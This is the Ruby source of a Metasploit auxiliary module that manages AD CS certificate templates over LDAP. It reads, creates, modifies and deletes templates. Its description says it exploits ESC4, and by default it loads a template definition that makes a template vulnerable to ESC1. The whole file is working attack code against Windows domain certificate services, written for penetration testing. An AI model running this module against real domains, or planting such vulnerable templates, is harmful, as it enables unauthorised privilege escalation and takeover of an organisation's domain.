##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::LDAP::ActiveDirectory
  include Msf::OptionalSession::LDAP
  include Msf::Auxiliary::Report

  IGNORED_ATTRIBUTES = [
    'dn',
    'distinguishedName',
    'objectClass',
    'cn',
    'whenCreated',
    'whenChanged',
    'name',
    'objectGUID',
    'objectCategory',
    'dSCorePropagationData',
    'msPKI-Cert-Template-OID',
    'uSNCreated',
    'uSNChanged',
    'displayName',
    'instanceType',
    'revision',
    'msPKI-Template-Schema-Version',
    'msPKI-Template-Minor-Revision',
  ].freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'AD CS Certificate Template Management',
        'Description' => %q{
          This module can create, read, update, and delete AD CS certificate templates from a Active Directory Domain
          Controller.

          The READ, UPDATE, and DELETE actions will write a copy of the certificate template to disk that can be
          restored using the CREATE or UPDATE actions. The CREATE and UPDATE actions require a certificate template data
          file to be specified to define the attributes. Template data files are provided to create a template that is
          vulnerable to ESC1, ESC2, ESC3 and ESC15.

          This module is capable of exploiting ESC4.
        },
        'Author' => [
          'Will Schroeder', # original idea/research
          'Lee Christensen', # original idea/research
          'Oliver Lyak', # certipy implementation
          'Spencer McIntyre'
        ],
        'References' => [
          [ 'URL', 'https://posts.specterops.io/certified-pre-owned-d95910965cd2' ],
          [ 'URL', 'https://github.com/GhostPack/Certify' ],
          [ 'URL', 'https://github.com/ly4k/Certipy' ]
        ],
        'License' => MSF_LICENSE,
        'Actions' => [
          ['CREATE', { 'Description' => 'Create the certificate template' }],
          ['READ', { 'Description' => 'Read the certificate template' }],
          ['UPDATE', { 'Description' => 'Modify the certificate template' }],
          ['DELETE', { 'Description' => 'Delete the certificate template' }]
        ],
        'DefaultAction' => 'READ',
        'Notes' => {
          'Stability' => [],
          'SideEffects' => [CONFIG_CHANGES],
          'Reliability' => [],
          'AKA' => [ 'Certifry', 'Certipy' ]
        }
      )
    )

    register_options([
      OptString.new('BASE_DN', [false, 'LDAP base DN if you already have it']),
      OptString.new('CERT_TEMPLATE', [ true, 'The remote certificate template name', 'User' ]),
      OptPath.new('TEMPLATE_FILE', [ false, 'Local template definition file', File.join(::Msf::Config.data_directory, 'auxiliary', 'admin', 'ldap', 'ad_cs_cert_template', 'esc1_template.yaml') ])
    ])
  end

  def run
    ldap_connect do |ldap|
      validate_bind_success!(ldap)

      if (@base_dn = datastore['BASE_DN'])
        print_status("User-specified base DN: #{@base_dn}")
      else
        print_status('Discovering base DN automatically')

        unless (@base_dn = ldap.base_dn)
          fail_with(Failure::NotFound, "Couldn't discover base DN!")
        end
      end
      @ldap = ldap

      result = send("action_#{action.name.downcase}")
      print_good('The operation completed successfully!')
      result
    end
  rescue Errno::ECONNRESET
    fail_with(Failure::Disconnected, 'The connection was reset.')
  rescue Rex::ConnectionError => e
    fail_with(Failure::Unreachable, e.message)
  rescue Rex::Proto::Kerberos::Model::Error::KerberosError => e
    fail_with(Failure::NoAccess, e.message)
  rescue Net::LDAP::Error => e
    fail_with(Failure::Unknown, "#{e.class}: #{e.message}")
  end

  def get_certificate_template
    obj = @ldap.search(
      filter: "(&(cn=#{datastore['CERT_TEMPLATE']})(objectClass=pKICertificateTemplate))",
      base: "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,#{@base_dn}",
      controls: [adds_build_ldap_sd_control(owner: false, group: false, dacl: true, sacl: false)]
    )&.first
    fail_with(Failure::NotFound, 'The specified template was not found.') unless obj

    print_good("Read certificate template data for: #{obj.dn}")
    stored = store_loot(
      'windows.ad.cs.template',
      'application/json',
      rhost,
      dump_to_json(obj),
      "#{datastore['CERT_TEMPLATE'].downcase.gsub(' ', '_')}_template.json",
      "#{datastore['CERT_TEMPLATE']} Certificate Template"
    )
    print_status("Certificate template data written to: #{stored}")
    [obj, stored]
  end

  def get_pki_oids
    return @pki_oids if @pki_oids.present?

    raw_objs = @ldap.search(
      base: "CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,#{@base_dn}",
      filter: '(objectClass=msPKI-Enterprise-OID)'
    )
    validate_query_result!(@ldap.get_operation_result.table)
    return nil unless raw_objs

    @pki_oids = []
    raw_objs.each do |raw_obj|
      obj = {}
      raw_obj.attribute_names.each do |attr|
        obj[attr.to_s] = raw_obj[attr].map(&:to_s)
      end

      @pki_oids << obj
    end
    @pki_oids
  end

  def get_pki_oid_displayname(oid)
    oid_obj = get_pki_oids.find { |o| o['mspki-cert-template-oid'].first == oid }
    return nil unless oid_obj && oid_obj['displayname'].present?

    oid_obj['displayname'].first
  end

  def dump_to_json(template)
    json = {}

    template.each do |attribute, values|
      next if IGNORED_ATTRIBUTES.any? { |word| word.casecmp?(attribute) }

      json[attribute] = values.map do |value|
        value.each_byte.map { |b| b.to_s(16).rjust(2, '0') }.join
      end
    end

    json.to_json
  end

  def load_from_json(json)
    template = {}

    JSON.parse(json).each do |attribute, values|
      next if IGNORED_ATTRIBUTES.any? { |word| word.casecmp?(attribute) }

      template[attribute] = values.map do |value|
        value.scan(/../).map { |x| x.hex.chr }.join
      end
    end

    template
  end

  def load_from_yaml(yaml)
    template = {}

    YAML.safe_load(yaml).each do |attribute, value|
      next if IGNORED_ATTRIBUTES.any? { |word| word.casecmp?(attribute) }

      if attribute.casecmp?('nTSecurityDescriptor')
        unless value.is_a?(String)
          fail_with(Failure::BadConfig, 'The local template file specified an invalid nTSecurityDescriptor.')
        end

        # if the string only contains printable characters, treat it as SDDL
        if value !~ /[^[:print:]]/
          vprint_status("Parsing SDDL text: #{value}")
          domain_info = adds_get_domain_info(@ldap)
          fail_with(Failure::Unknown, 'Failed to obtain the domain SID.') unless domain_info

          begin
            descriptor = Rex::Proto::MsDtyp::MsDtypSecurityDescriptor.from_sddl_text(value, domain_sid: domain_info[:sid])
          rescue RuntimeError => e
            fail_with(Failure::BadConfig, e.message)
          end

          value = descriptor.to_binary_s
        elsif !value.start_with?("\x01".b)
          fail_with(Failure::BadConfig, 'The local template file specified an invalid nTSecurityDescriptor.')
        end
      end

      value = [ value ] unless value.is_a?(Array)
      template[attribute] = value.map(&:to_s)
    end

    template
  end

  def load_local_template
    if datastore['TEMPLATE_FILE'].blank?
      fail_with(Failure::BadConfig, 'No local template file was specified in TEMPLATE_FILE.')
    end

    unless File.readable?(datastore['TEMPLATE_FILE']) && File.file?(datastore['TEMPLATE_FILE'])
      fail_with(Failure::BadConfig, 'TEMPLATE_FILE must be a readable file.')
    end

    file_data = File.read(datastore['TEMPLATE_FILE'])
    if datastore['TEMPLATE_FILE'].downcase.end_with?('.json')
      load_from_json(file_data)
    elsif datastore['TEMPLATE_FILE'].downcase.end_with?('.yaml') || datastore['TEMPLATE_FILE'].downcase.end_with?('.yml')
      load_from_yaml(file_data)
    else
      fail_with(Failure::BadConfig, 'TEMPLATE_FILE must be a JSON or YAML file.')
    end
  end

  def action_create
    dn = "CN=#{datastore['CERT_TEMPLATE']},"
    dn << 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,'
    dn << @base_dn

    # defaults to create one from the builtin SubCA template
    # the nTSecurityDescriptor and objectGUID fields will be set automatically so they can be omitted
    attributes = {
      'objectclass' => ['top', 'pKICertificateTemplate'],
      'cn' => datastore['CERT_TEMPLATE'],
      'instancetype' => '4',
      'displayname' => datastore['CERT_TEMPLATE'],
      'usncreated' => '16437',
      'usnchanged' => '16437',
      'showinadvancedviewonly' => 'TRUE',
      'name' => datastore['CERT_TEMPLATE'],
      'flags' => '66257',
      'revision' => '5',
      'objectcategory' => "CN=PKI-Certificate-Template,CN=Schema,CN=Configuration,#{@base_dn}",
      'pkidefaultkeyspec' => '2',
      'pkikeyusage' => "\x86\x00".b,
      'pkimaxissuingdepth' => '-1',
      'pkicriticalextensions' => ['2.5.29.15', '2.5.29.19'],
      'pkiexpirationperiod' => "\x00@\x1E\xA4\xE8e\xFA\xFF".b,
      'pkioverlapperiod' => "\x00\x80\xA6\n\xFF\xDE\xFF\xFF".b,
      'pkidefaultcsps' => '1,Microsoft Enhanced Cryptographic Provider v1.0',
      'dscorepropagationdata' => '16010101000000.0Z',
      'mspki-ra-signature' => '0',
      'mspki-enrollment-flag' => '0',
      'mspki-private-key-flag' => '16',
      'mspki-certificate-name-flag' => '1',
      'mspki-minimal-key-size' => '2048',
      'mspki-template-schema-version' => '1',
      'mspki-template-minor-revision' => '1',
      'mspki-cert-template-oid' => '1.3.6.1.4.1.311.21.8.9238385.12403672.2312086.11590436.9092015.147.1.18'
    }

    unless datastore['TEMPLATE_FILE'].blank?
      load_local_template.each do |key, value|
        key = key.downcase
        next if %w[dn distinguishedname objectguid].include?(key)

        attributes[key.downcase] = value
      end
    end

    # can not contain dn, distinguishedname, or objectguid
    print_status("Creating: #{dn}")
    @ldap.add(dn: dn, attributes: attributes)
    validate_query_result!(@ldap.get_operation_result.table)
    dn
  end

  def action_delete
    obj, = get_certificate_template

    @ldap.delete(dn: obj['dn'].first)
    validate_query_result!(@ldap.get_operation_result.table)
    true
  end

  def action_read
    obj, stored = get_certificate_template

    print_status('Certificate Template:')
    print_status("  distinguishedName:    #{obj['distinguishedname'].first}")
    print_status("  displayName:          #{obj['displayname'].first}") if obj['displayname'].present?
    if obj['objectguid'].first.present?
      object_guid = Rex::Proto::MsDtyp::MsDtypGuid.read(obj['objectguid'].first)
      print_status("  objectGUID:           #{object_guid}")
    end

    if obj[:nTSecurityDescriptor].first.present?
      domain_info = adds_get_domain_info(@ldap)
      fail_with(Failure::Unknown, 'Failed to obtain the domain SID.') unless domain_info

      begin
        sd = Rex::Proto::MsDtyp::MsDtypSecurityDescriptor.read(obj[:nTSecurityDescriptor].first)
        sddl_text = sd.to_sddl_text(domain_sid: domain_info[:sid])
      rescue StandardError => e
        elog('failed to parse a binary security descriptor to SDDL', error: e)
      else
        print_status("  nTSecurityDescriptor: #{sddl_text}")
        if adds_obj_grants_permissions?(@ldap, obj, SecurityDescriptorMatcher::Allow.full_control)
          permissions = [ 'FULL CONTROL' ]
        else
          permissions = [ 'READ' ] # if we have the object, we can assume we have read permissions
          permissions << 'WRITE' if adds_obj_grants_permissions?(@ldap, obj, SecurityDescriptorMatcher::Allow.new(:WP))
          permissions << 'ENROLL' if adds_obj_grants_permissions?(@ldap, obj, SecurityDescriptorMatcher::Allow.certificate_enrollment)
          permissions << 'AUTOENROLL' if adds_obj_grants_permissions?(@ldap, obj, SecurityDescriptorMatcher::Allow.certificate_autoenrollment)
        end
        whoami = adds_get_current_user(@ldap)
        print_status("    * Permissions applied for #{whoami[:userPrincipalName].first}: #{permissions.join(', ')}")
      end
    end

    pki_flag = obj['flags']&.first
    if pki_flag.present?
      pki_flag = [obj['flags'].first.to_i].pack('l').unpack1('L')
      print_status("  flags: 0x#{pki_flag.to_s(16).rjust(8, '0')}")
      %w[
        CT_FLAG_AUTO_ENROLLMENT
        CT_FLAG_MACHINE_TYPE
        CT_FLAG_IS_CA
        CT_FLAG_ADD_TEMPLATE_NAME
        CT_FLAG_IS_CROSS_CA
        CT_FLAG_IS_DEFAULT
        CT_FLAG_IS_MODIFIED
        CT_FLAG_DONOTPERSISTINDB
        CT_FLAG_ADD_EMAIL
        CT_FLAG_PUBLISH_TO_DS
        CT_FLAG_EXPORTABLE_KEY
      ].each do |flag_name|
        if pki_flag & Rex::Proto::MsCrtd.const_get(flag_name) != 0
          print_status("    * #{flag_name}")
        end
      end
    end

    pki_flag = obj['mspki-certificate-name-flag']&.first
    if pki_flag.present?
      pki_flag = [obj['mspki-certificate-name-flag'].first.to_i].pack('l').unpack1('L')
      print_status("  msPKI-Certificate-Name-Flag: 0x#{pki_flag.to_s(16).rjust(8, '0')}")
      %w[
        CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
        CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME
        CT_FLAG_SUBJECT_ALT_REQUIRE_DOMAIN_DNS
        CT_FLAG_SUBJECT_ALT_REQUIRE_SPN
        CT_FLAG_SUBJECT_ALT_REQUIRE_DIRECTORY_GUID
        CT_FLAG_SUBJECT_ALT_REQUIRE_UPN
        CT_FLAG_SUBJECT_ALT_REQUIRE_EMAIL
        CT_FLAG_SUBJECT_ALT_REQUIRE_DNS
        CT_FLAG_SUBJECT_REQUIRE_DNS_AS_CN
        CT_FLAG_SUBJECT_REQUIRE_EMAIL
        CT_FLAG_SUBJECT_REQUIRE_COMMON_NAME
        CT_FLAG_SUBJECT_REQUIRE_DIRECTORY_PATH
        CT_FLAG_OLD_CERT_SUPPLIES_SUBJECT_AND_ALT_NAME
      ].each do |flag_name|
        if pki_flag & Rex::Proto::MsCrtd.const_get(flag_name) != 0
          print_status("    * #{flag_name}")
        end
      end
    end

    pki_flag = obj['mspki-enrollment-flag']&.first
    if pki_flag.present?
      pki_flag = [obj['mspki-enrollment-flag'].first.to_i].pack('l').unpack1('L')
      print_status("  msPKI-Enrollment-Flag: 0x#{pki_flag.to_s(16).rjust(8, '0')}")
      %w[
        CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS
        CT_FLAG_PEND_ALL_REQUESTS
        CT_FLAG_PUBLISH_TO_KRA_CONTAINER
        CT_FLAG_PUBLISH_TO_DS
        CT_FLAG_AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE
        CT_FLAG_AUTO_ENROLLMENT
        CT_FLAG_PREVIOUS_APPROVAL_VALIDATE_REENROLLMENT
        CT_FLAG_USER_INTERACTION_REQUIRED
        CT_FLAG_REMOVE_INVALID_CERTIFICATE_FROM_PERSONAL_STORE
        CT_FLAG_ALLOW_ENROLL_ON_BEHALF_OF
        CT_FLAG_ADD_OCSP_NOCHECK
        CT_FLAG_ENABLE_KEY_REUSE_ON_NT_TOKEN_KEYSET_STORAGE_FULL
        CT_FLAG_NOREVOCATIONINFOINISSUEDCERTS
        CT_FLAG_INCLUDE_BASIC_CONSTRAINTS_FOR_EE_CERTS
        CT_FLAG_ALLOW_PREVIOUS_APPROVAL_KEYBASEDRENEWAL_VALIDATE_REENROLLMENT
        CT_FLAG_ISSUANCE_POLICIES_FROM_REQUEST
        CT_FLAG_SKIP_AUTO_RENEWAL
      ].each do |flag_name|
        if pki_flag & Rex::Proto::MsCrtd.const_get(flag_name) != 0
          print_status("    * #{flag_name}")
        end
      end
    end

    pki_flag = obj['mspki-private-key-flag']&.first
    if pki_flag.present?
      pki_flag = [obj['mspki-private-key-flag'].first.to_i].pack('l').unpack1('L')
      print_status("  msPKI-Private-Key-Flag: 0x#{pki_flag.to_s(16).rjust(8, '0')}")
      %w[
        CT_FLAG_REQUIRE_PRIVATE_KEY_ARCHIVAL
        CT_FLAG_EXPORTABLE_KEY
        CT_FLAG_STRONG_KEY_PROTECTION_REQUIRED
        CT_FLAG_REQUIRE_ALTERNATE_SIGNATURE_ALGORITHM
        CT_FLAG_REQUIRE_SAME_KEY_RENEWAL
        CT_FLAG_USE_LEGACY_PROVIDER
        CT_FLAG_ATTEST_NONE
        CT_FLAG_ATTEST_REQUIRED
        CT_FLAG_ATTEST_PREFERRED
        CT_FLAG_ATTESTATION_WITHOUT_POLICY
        CT_FLAG_EK_TRUST_ON_USE
        CT_FLAG_EK_VALIDATE_CERT
        CT_FLAG_EK_VALIDATE_KEY
        CT_FLAG_HELLO_LOGON_KEY
      ].each do |flag_name|
        if pki_flag & Rex::Proto::MsCrtd.const_get(flag_name) != 0
          print_status("    * #{flag_name}")
        end
      end
    end

    pki_flag = obj['mspki-ra-signature']&.first
    if pki_flag.present?
      pki_flag = [pki_flag.to_i].pack('l').unpack1('L')
      print_status("  msPKI-RA-Signature: 0x#{pki_flag.to_s(16).rjust(8, '0')}")
    end

    pki_flag = obj['mkpki-template-schema-version']&.first
    if pki_flag.present?
      print_status("  msPKI-Template-Schema-Version: #{pki_flag}")
    end

    if obj['mspki-certificate-policy'].present?
      if obj['mspki-certificate-policy'].length == 1
        if (oid_name = get_pki_oid_displayname(obj['mspki-certificate-policy'].first)).present?
          print_status("  msPKI-Certificate-Policy: #{obj['mspki-certificate-policy'].first} (#{oid_name})")
        else
          print_status("  msPKI-Certificate-Policy: #{obj['mspki-certificate-policy'].first}")
        end
      else
        print_status('  msPKI-Certificate-Policy:')
        obj['mspki-certificate-policy'].each do |value|
          if (oid_name = get_pki_oid_displayname(value)).present?
            print_status("    * #{value} (#{oid_name})")
          else
            print_status("    * #{value}")
          end
        end
      end
    end

    if obj['mspki-template-schema-version'].present?
      print_status("  msPKI-Template-Schema-Version: #{obj['mspki-template-schema-version'].first.to_i}")
    end

    pki_flag = obj['pkikeyusage']&.first
    if pki_flag.present?
      pki_flag = [pki_flag.to_i].pack('l').unpack1('L')
      print_status("  pKIKeyUsage: 0x#{pki_flag.to_s(16).rjust(8, '0')}")
    end

    if obj['pkiextendedkeyusage'].present?
      print_status('  pKIExtendedKeyUsage:')
      obj['pkiextendedkeyusage'].each do |value|
        if (oid = Rex::Proto::CryptoAsn1::OIDs.value(value)) && oid.label.present?
          print_status("    * #{value} (#{oid.label})")
        else
          print_status("    * #{value}")
        end
      end
    end

    if obj['pkimaxissuingdepth'].present?
      print_status("  pKIMaxIssuingDepth: #{obj['pkimaxissuingdepth'].first.to_i}")
    end

    if obj['showinadvancedviewonly'].present?
      print_status("  showInAdvancedViewOnly: #{obj['showinadvancedviewonly'].first}")
    end

    { object: obj, file: stored }
  end

  def action_update
    obj, = get_certificate_template
    new_configuration = load_local_template

    operations = []
    obj.each do |attribute, value|
      next if IGNORED_ATTRIBUTES.any? { |word| word.casecmp?(attribute) }

      if new_configuration.keys.any? { |word| word.casecmp?(attribute) }
        new_value = new_configuration.find { |k, _| k.casecmp?(attribute) }.last
        unless value.tally == new_value.tally
          operations << [:replace, attribute, new_value]
        end
      elsif attribute == 'ntsecuritydescriptor'
        # the security descriptor can't be deleted so leave it alone unless specified
      else
        operations << [:delete, attribute, nil]
      end
    end

    new_configuration.each_key do |attribute|
      next if IGNORED_ATTRIBUTES.any? { |word| word.casecmp?(attribute) }
      next if obj.attribute_names.any? { |i| i.casecmp?(attribute) }

      operations << [:add, attribute, new_configuration[attribute]]
    end

    if operations.empty?
      print_good('There are no changes to be made.')
      return true
    end

    @ldap.modify(dn: obj.dn, operations: operations, controls: [adds_build_ldap_sd_control(owner: false, group: false)])
    validate_query_result!(@ldap.get_operation_result.table)
    true
  end
end
